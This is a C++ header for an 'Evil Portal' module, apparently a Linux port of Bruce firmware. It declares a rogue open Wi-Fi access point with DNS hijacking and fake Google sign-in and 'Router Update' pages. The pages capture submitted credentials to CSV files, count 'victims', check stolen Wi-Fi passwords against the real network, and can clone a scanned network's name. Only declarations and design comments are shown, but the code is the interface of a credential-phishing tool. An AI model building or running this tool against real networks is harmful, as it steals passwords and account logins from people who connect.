/*
 * SPDX-FileCopyrightText: 2026 Bruce CardputerZero Community
 *
 * SPDX-License-Identifier: AGPL-3.0-only
 *
 * Evil Portal - Linux port of the ESP32 Bruce firmware feature (pr3y/Bruce,
 * src/modules/wifi/evil_portal.cpp). Same behavior: an open AP with a chosen
 * SSID, every DNS answer pointing at the AP, an HTTP captive portal serving
 * the Bruce pages, submitted credentials captured to
 * ~/.bruce/BruceEvilCreds/<file>.csv exactly like the ESP32 writes
 * /BruceEvilCreds/<file>.csv, plus the /creds (view), /ssid and /postssid
 * (live SSID change) routes and the "Router Update" page that verifies the
 * stolen password against the real network before logging valid: true/false.
 *
 * On Linux the AP comes from hostapd and DNS+DHCP from dnsmasq (the ESP32
 * equivalents are WiFi.softAP and DNSServer), so those binaries must exist
 * and the app must run as root - same requirement as the rest of the
 * Wi-Fi tooling.
 */

#pragma once

#include <functional>
#include <string>
#include <utility>
#include <vector>

namespace platform {

// --- request/response model (shared by the live server and the self-check) ---

struct HttpRequest {
    std::string method; // "GET" / "POST"
    std::string path;   // "/post", "/creds", ... (no query string)
    std::string host;   // Host: header, port stripped ("" if absent)
    // Form arguments, query string first then urlencoded POST body, in order.
    std::vector<std::pair<std::string, std::string>> args;
};

struct HttpResponse {
    int status = 200;
    std::string body;
    std::string location; // Location target when status is a redirect (302)
};

// Everything the portal needs to run. `html_page` is what "/"/unknown paths
// serve (Bruce's htmlPage): the default Google page, the Router Update page
// or a custom HTML file. `output_file` is the CSV name inside creds_dir for
// plain captures; verify mode writes <ap_name>_creds.csv instead (Bruce's
// saveToCSV(..., isAPname=true) in the verify path).
struct PortalOptions {
    std::string ap_name = "Free Wifi"; // Bruce's keyboard default
    std::string gateway = "192.168.4.1";
    int channel = 1;
    std::string html_page;
    std::string output_file = "default_creds.csv";
    bool verify_mode = false;
    std::string creds_dir;      // $HOME/.bruce/BruceEvilCreds (set by evil_portal_main)
    std::string country;        // optional --country <CC>; resolved by PortalNet otherwise
};

// Live counters shown in the run log (Bruce's screen shows the same numbers).
struct PortalState {
    int victims = 0;
    std::string captured_html; // accumulated "<li>key: value<br>...</li>\n" entries
    std::string last_cred;     // human-readable "ema: ..., pas: ..." of the last capture
};

// Live-mode hooks. The self-check injects fakes; evil_portal_main injects the
// hostapd/dnsmasq/wpa_supplicant implementations.
struct PortalHooks {
    // Restart the AP with opts.ap_name (the /postssid route; Bruce restarts
    // the softAP under the new name). May be null (no-op) in tests.
    std::function<void(const PortalOptions&)> on_ap_restart;
    // Try to connect to ap_name using the submitted password; true = valid.
    // Bruce: WiFi.begin() + 12 x 500ms wait (6s; verifyCreds:856-860 loops
    // i=1..12). May be null -> treated as failed
    // verification but still captured.
    std::function<bool(const PortalOptions&, const std::string& password)> verify_password;
};

// --- pure helpers (unit-checked in tests/evil_portal_selfcheck.cpp) ---------

// Percent-decoding of a urlencoded token ('+' becomes space).
std::string url_decode(const std::string& s);

// Bruce's credsController skips these keys when recording credentials
// (tracking/noise parameters from real-world captive portals).
bool is_noise_key(const std::string& key);

// "a=1&b=two" (or a POST body) -> ordered key/value pairs.
std::vector<std::pair<std::string, std::string>> parse_form_args(const std::string& encoded);

// The CSV row Bruce writes: "key: value, key2: value2" over the filtered args.
std::string csv_line(const std::vector<std::pair<std::string, std::string>>& args);

// The <li> entry prepended to the /creds list: "key: value<br>\n" per arg.
std::string captured_li(const std::vector<std::pair<std::string, std::string>>& args);

// The on-log view of one capture (Bruce's lastCred): first 3 chars of each key.
std::string last_cred_text(const std::vector<std::pair<std::string, std::string>>& args);

// First line "<!-- AP=\"MyName\" -->" of a custom HTML file -> "MyName"
// (Bruce's loadCustomHtml). Empty when absent.
std::string parse_ap_tag(const std::string& html);

// Custom-HTML capture file name: strip directory and ".html", lowercase, add
// "_creds.csv" (Bruce's loadCustomHtml, evil_portal.cpp:500-502).
std::string custom_csv_name(const std::string& path);

// Parse one raw HTTP request head (+ optional body). Query-string args are
// merged into args after body args; Content-Length bounds the body read.
HttpRequest parse_http_request(const std::string& raw);

// --- Bruce's pages (copied verbatim from the ESP32 firmware) ---------------

const char* default_portal_html(); // "Sign in: Google Accounts" (default_creds.csv)
const char* verify_portal_html();  // "Router Update" password-verify page
const char* wifi_load_html();      // animated Wi-Fi logo shown after a capture

// Bruce's getHtmlTemplate(): portal-styled wrapper with the AP name as title.
std::string portal_template(const std::string& ap_name, const std::string& body);
std::string creds_page(const std::string& ap_name, const std::string& captured_html);
std::string ssid_page(const std::string& ap_name);
std::string ssid_post_page(const std::string& ap_name);

// --- config generators (hostapd/dnsmasq/wpa_supplicant) ---------------------

// Open-AP config for hostapd (driver line required, or hostapd refuses to
// start - the bug the old "Rogue open AP" menu entry had). A non-empty
// `country` adds country_code=<CC> + ieee80211d=1: setting a regulatory domain
// for a non-self-managed radio is correct practice (and some firmware/channel
// combinations need it to beacon). The confirmed fix for the Pi's brcmfmac not
// beaconing was the full interface release, not the country alone.
std::string hostapd_conf(const std::string& iface, const std::string& ssid, int channel,
                         const std::string& country = "");

// A syntactically valid 2-letter country code (ASCII letters). Uppercased
// forms are canonical; pass the result of to-upper for comparison.
bool valid_country(const std::string& cc);

// The country from `iw reg get` output: the FIRST line that begins with
// "country XX:", uppercased, or "" when unset ("country 00:" / world / absent).
// Line-anchored but still a simple first-record read, not a PHY/interface-aware
// selection - with multiple regulatory sections it is best-effort.
std::string parse_reg_country(const std::string& iw_reg_get_output);

// Does ANY wiphy in `iw reg get` self-manage its regulatory domain? `iw reg
// get` prints a "phy#N (self-managed)" line for such a device. Global (not
// scoped to one interface) - prefer phy_is_self_managed() for a decision about
// a specific radio.
bool reg_is_self_managed(const std::string& iw_reg_get_output);

// The wiphy index for an interface, parsed from `iw dev <iface> info` ("wiphy
// N"), or -1 if absent/unparseable.
int parse_wiphy_index(const std::string& iw_dev_info_output);

// Is the given wiphy (by index) self-managed? Inspects ONLY that phy's
// "phy#<index>[ (self-managed)]" header in `iw reg get`, so a second,
// self-managed radio elsewhere in the output never misclassifies this one.
// A self-managed radio needs no country_code / `iw reg set`; a non-self-managed
// one is given a regulatory domain as correct practice.
bool phy_is_self_managed(const std::string& iw_reg_get_output, int phy_index);

// Does hostapd's log show OUR interface's AP currently enabled? Scans COMPLETE
// (newline-terminated) lines for exact "<iface>: AP-ENABLED" records and
// honours the LAST AP-state event, so an AP-ENABLED later cancelled by an
// AP-DISABLED / INTERFACE-DISABLED reads as NOT enabled. Note: a log event is
// not itself proof that a beacon is on the air.
bool ap_event_enabled(const std::string& iface, const std::string& hostapd_log);

// Did OUR interface's AP EVER reach AP-ENABLED in the log (any complete
// "<iface>: AP-ENABLED" record), regardless of a later AP-DISABLED? Used for
// diagnostics only - it distinguishes "never enabled" from "enabled then
// dropped"; readiness still uses ap_event_enabled() (the LAST state).
bool ap_event_ever_enabled(const std::string& iface, const std::string& hostapd_log);
// DHCP + DNS hijack: every name resolves to the gateway, clients get it as
// router and DNS server - the Linux stand-in for DNSServer.start(53, "*", ip).
// dnsmasq listens on `dns_port` (an alternate high port) so it can coexist
// with a system resolver already holding the wildcard 0.0.0.0:53; a DNAT
// (see nft_dnat_script) redirects clients' :53 traffic to it. DHCP stays on 67.
std::string dnsmasq_conf(const std::string& iface, const std::string& gateway, int dns_port = 1053);
// One-network wpa_supplicant config for password verification.
std::string wpa_conf(const std::string& ssid, const std::string& password);

// --- captive DNS redirect (coexist with a system dnsmasq / systemd-resolved) -
//
// Our dnsmasq cannot bind 192.168.4.1:53 when a system resolver holds a
// wildcard :53 socket ("Address already in use"). Instead it listens on an
// alternate high port and a narrowly-scoped DNAT sends clients' :53 traffic
// (udp AND tcp) there. Connection tracking reverses the translation, so
// replies come from :53 and no IP forwarding/masquerade is needed. We never
// touch the system resolver and never flush the host ruleset.

// Alternate DNS ports to try, in order. 1053 first; deliberately NOT 5353
// (mDNS). The running portal picks the first one free on the gateway address.
std::vector<int> dns_port_candidates();

// nftables table that holds our DNAT. Removed wholesale on teardown.
const char* dns_dnat_table(); // "bruce_portal_dns"

// Script fed to `nft -f -`: a dedicated `ip` table with a prerouting nat chain
// (priority dstnat/-101) DNAT-ing udp+tcp dport 53 to <gateway>:<dns_port>,
// scoped to `iifname <iface>` and `ip daddr <gateway>`.
std::string nft_dnat_script(const std::string& iface, const std::string& gateway, int dns_port);

// Teardown argument to `nft`: removes ONLY our table ("delete table ip bruce_portal_dns").
std::string nft_dnat_delete();

// iptables -t nat fallback when nft is unavailable. The add, the matching
// delete, and a `-C` check (is the rule still present?), one per line, each
// `-w` (wait for the xtables lock) and tagged with an `-m comment` so teardown
// removes exactly our rules and nothing of the host ruleset.
std::string iptables_dnat_add(const std::string& iface, const std::string& gateway, int dns_port);
std::string iptables_dnat_delete(const std::string& iface, const std::string& gateway, int dns_port);
std::string iptables_dnat_check(const std::string& iface, const std::string& gateway, int dns_port);

// --- interface ownership / teardown -----------------------------------------

// Which backend installed the captive DNS redirect (so teardown matches it).
enum class DnatBackend { None, Nft, Iptables };

// One DNAT resource we are responsible for removing. We track each rule we may
// have installed (per protocol for iptables; one entry for the nft table), with
// its gateway/port, so teardown removes EXACTLY those - even across a port
// change (1053 -> 1054), and even a single rule that survived a partial install.
struct DnatRule {
    DnatBackend backend = DnatBackend::None;
    std::string gateway;
    int port = 0;
    std::string proto; // "udp"/"tcp" for iptables; "" for the nft table
};

// Networking state recorded BEFORE the portal mutates anything, so cleanup()
// can restore exactly what it changed and nothing else.
struct NetState {
    std::string iface;
    std::string gateway;
    std::string country;             // regulatory domain for the AP (resolved before mutation)
    std::string orig_country;        // device regdom before we changed it ("" = unknown/world)
    bool reg_self_managed = false;   // wiphy sets its own regdom (no country_code/iw reg set)
    bool regdom_changed = false;     // we issued `iw reg set` and owe a restore
    int dns_port = 0;                // chosen alternate DNS port (0 = none yet)
    DnatBackend dnat = DnatBackend::None; // backend of the CURRENTLY-active redirect (for the log)
    std::vector<DnatRule> dnat_rules;     // rules still owed a (confirmed) removal
    bool nmcli_present = false;       // nmcli on PATH (NetworkManager in use)
    bool ownership_read_ok = false;   // the managed-state read succeeded (vs failed/invalid)
    bool iface_was_managed = false;   // iface was explicitly NM-managed before we took it
    std::string active_uuid;          // NM connection to re-up on exit ("" = none/invalid)
    std::string autoconnect;          // the DEVICE autoconnect (GENERAL.AUTOCONNECT) ("yes"/"no"/"")
};

// The FULL interface-release command sequence run before hostapd (so it owns
// the radio): disconnect any association, mark the NIC NM-unmanaged, and bring
// the link down. `managed no` alone left wlan0 associated to the home AP on its
// channel, so hostapd could not set the AP channel. Each is run checked, in
// order, with a post-condition link check (see PortalNet::release_interface).
std::vector<std::string> iface_release_commands(const std::string& iface);

// The reverse restore sequence for teardown: remove the gateway address, cycle
// the link, put the type back to managed, restore the original regdom (when we
// changed it and know it), and - only if the iface was NM-managed - hand it
// back to NetworkManager, restore the connection's autoconnect, and bring the
// saved connection up. Pure/deterministic; cleanup() runs it with result checks
// (an absent-address delete is benign).
std::vector<std::string> iface_restore_commands(const NetState& st);

// true if s is a syntactically valid NM/RFC4122 UUID (hex groups 8-4-4-4-12).
// Guards the value before it reaches `nmcli connection up uuid <...>`.
bool valid_uuid(const std::string& s);

// --- injectable command environment (so the lifecycle is unit-testable) -----

// Result of running one external command.
struct CmdResult {
    int status = -1;     // process exit status, 0 == success (-1 == could not run)
    std::string out;     // captured stdout
};

// Every side effect the portal lifecycle performs goes through this seam, so
// the self-check can drive setup/restart/teardown with a fake runner and assert
// the exact command effects and ordering without root or a real radio.
// default_portal_env() wires these to the real system calls.
struct PortalEnv {
    std::function<CmdResult(const std::string& cmd)> exec;          // run; capture status+stdout
    std::function<bool(const std::string& tool)> have_cmd;         // tool available?
    std::function<bool(const std::string& path)> path_exists;      // pidfile written? (readiness)
    std::function<bool(const std::string& addr, int port)> port_free; // addr:port bindable?
    std::function<void(const std::string& path, const std::string& content)> write_file;
    std::function<bool(const std::string& iface)> wait_connected;  // verify: poll wpa -> connected?
    std::function<void(const std::string& pid_name)> kill_pidfile; // stop a tracked daemon
    // AP-readiness primitives (the polling + log parsing lives in PortalNet so
    // it is unit-testable): read a file's current contents, is the pidfile's
    // process actually alive, and a (test-noop) inter-poll sleep.
    std::function<std::string(const std::string& path)> read_file;
    std::function<bool(const std::string& pid_path)> pid_alive;
    std::function<void(int ms)> sleep_ms;

    int run(const std::string& c) const { return exec(c).status; } // fire-and-check
    bool run_ok(const std::string& c) const { return exec(c).status == 0; }
};

// The real environment (system()/popen()/bind()/filesystem). Linux-only.
PortalEnv default_portal_env();

// Aggregate readiness of a (re)start: the AP, the resolver, and the DNS
// redirect must ALL be up, or the portal must not claim success.
struct StartResult {
    bool regdom = false;  // `iw reg set <CC>` succeeded (country established first)
    bool hostapd = false; // AP reached (and still at) AP-ENABLED, pid alive
    bool dnsmasq = false;
    bool dnat = false;
    // Self-diagnosis for a failed AP readiness (printed on-device so we never
    // need an SSH experiment to tell a slow-to-beacon radio from a dead pid):
    bool ap_event_seen = false;  // an AP-ENABLED record EVER appeared (even if later disabled)
    bool pid_ever_alive = false; // the tracked hostapd pid was ever alive
    int  ap_wait_ms = 0;         // measured elapsed ms waited in await_ap_enabled (monotonic clock)
    bool ok() const { return regdom && hostapd && dnsmasq && dnat; }
};

// Owns the AP + captive-DNS + firewall + NetworkManager lifecycle for one run.
// All side effects go through the injected PortalEnv; NetState records what was
// changed so cleanup() restores exactly that. cleanup() is idempotent on
// success and retries after a failed attempt (it does not mark itself done, nor
// forget an un-removed DNAT, until teardown actually succeeds).
class PortalNet {
public:
    explicit PortalNet(PortalEnv env) : env_(std::move(env)) {}

    void set_interface(const std::string& iface, const std::string& gateway);
    const NetState& state() const { return net_; }

    bool capture_ownership();   // read NM managed-state; false => read failed (do NOT mutate)
    // Resolve the AP regulatory domain BEFORE any mutation: `cli_country` (from
    // --country) wins, else the device's current `iw reg get` country. false
    // (with `err` set) when `iw` is missing or the country is unknown/world -
    // a non-self-managed radio is given a regulatory domain as correct practice.
    // Self-managed detection is scoped to THIS iface's wiphy.
    bool resolve_country(const std::string& cli_country, std::string& err);
    bool release_interface();   // full release + confirm disconnected; false => release failed
    StartResult start(const PortalOptions& opts);            // bring AP+DNS+DNAT up
    bool stop();                // down for a restart; false => a tracked DNAT rule survived
    bool verify(const PortalOptions& opts, const std::string& password, StartResult& restart);
    bool cleanup();             // one teardown pass; true => fully clean (safe to stop retrying)
    bool teardown(int attempts); // cleanup() with bounded retry; true => fully clean
                                 // (shared by every post-mutation exit in serve_portal)

private:
    // Tri-state: a failed inspection (exec/permission/backend error) is Unknown,
    // never silently treated as Absent - we retain ownership on unknown state.
    enum class Presence { Present, Absent, Unknown };

    // CONFIRMED absence of <gateway>/.. on <iface> (a successful inspection that
    // shows it gone), so a failed `ip addr del` can be called benign only then.
    bool addr_absent(const std::string& iface, const std::string& gateway);
    bool install_dnat();                      // only after dnsmasq is confirmed up
    bool await_ap_enabled(StartResult& res);  // poll: pid alive AND AP-ENABLED (bounded window)
    void track_rule(const DnatRule& r);       // record a rule we may have installed
    bool purge_dnat();                        // delete+confirm each tracked rule; keep survivors
    Presence nft_presence();                  // is our nft table there? (status + stderr marker)
    Presence ipt_presence(const DnatRule& r); // is this iptables rule there? (-C + marker)

    PortalEnv env_;
    NetState net_;
    bool cleaned_ = false;
};

// --- request routing ---------------------------------------------------------

// One request through Bruce's route table (/, /post, /creds, /ssid,
// /postssid, onNotFound). Returns the response to send; mutates state,
// appends CSV files and fires hooks exactly like the ESP32 handlers.
HttpResponse portal_handle_request(const HttpRequest& req, PortalOptions& opts,
                                  PortalState& state, const PortalHooks& hooks);

// --- entry point -------------------------------------------------------------

// `--evil-portal <mode> [args...]`
//   default [ssid]          Google page AP (Bruce "Default")
//   verify  [ssid]          Router-Update page + password check ("Default (one)")
//   custom  <file> [ssid]   HTML from file, <!-- AP="..." --> sets the name
//   clone   <ssid> [chan]   clone a scanned AP ("Clone Portal")
// Long-running: streams the portal log until SIGTERM/SIGINT.
int evil_portal_main(int argc, char** argv);

} // namespace platform
